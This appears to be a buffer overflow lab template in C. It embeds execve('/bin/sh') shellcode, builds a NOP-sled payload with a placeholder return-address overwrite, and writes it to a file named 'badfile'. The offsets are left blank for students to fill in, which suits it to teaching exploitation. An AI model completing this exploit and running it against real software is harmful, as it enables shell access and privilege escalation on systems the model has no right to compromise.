#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"           
;

void main(int argc, char **argv)
{
  char buffer[300];
  FILE *badfile;

  /* Initialize buffer with 0x90 (NOP instruction) */
  memset(&buffer, 0x90, 300);

/* Fill the return address field with a candidate 
        entry point of the malicious code */
  /* XXXX and YYYY are to be filled with the offset 
        and modified return address */
  *((long *) (buffer + XXXX)) = YYYY;
	
  /* Copy the shellcode to buffer */
  /* ZZZZ is to be filled with the pointer pointing to 
        where the shellcode will be copied*/
  memcpy(ZZZZ, shellcode, sizeof(shellcode));

  /* Save the contents to the file "badfile" */
  badfile = fopen("./badfile", "w");
  fwrite(buffer, 300, 1, badfile);
  fclose(badfile);
}